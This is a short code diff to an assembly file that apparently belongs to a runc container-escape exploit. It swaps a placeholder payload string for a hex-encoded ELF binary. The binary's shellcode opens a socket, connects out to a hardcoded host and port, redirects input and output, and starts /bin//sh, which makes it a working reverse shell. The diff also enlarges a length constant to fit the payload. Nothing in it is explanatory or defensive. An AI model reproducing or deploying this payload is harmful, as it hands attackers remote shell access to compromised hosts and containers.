@@ -138,7 +138,7 @@ section .data
     O_RDONLY           equ    000000q        ; read only
     BUFF_SIZE          equ 255
     PAGE_SIZE           equ 65536
-    MAX_LENGTH equ 10
+    MAX_LENGTH equ 100
     ; ********string*******
     runc db '/tmp/fd',NULL ; runc fd
     writeDone      db       "Write Completed.", LF, NULL
@@ -146,7 +146,7 @@ section .data
     errMsgOpen         db    "Error opening the file.", LF, NULL
     errMsgRead         db    "Error reading from the file.", LF, NULL
     fileDesc       dq       0
-    payload db "st0n3st0n3st0n3",NULL
+    payload db 0x7f454c460101010000000000000000000200030001000000548004083400000000000000000000003400200001000000000000000100000000000000008004080080040898000000dc000000070000000010000031dbf7e35343536a0289e1b066cd809359b03fcd804979f968fffefdfc6802005b2589e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80
 
 section    .bss
 readBuffer resb     BUFF_SIZE
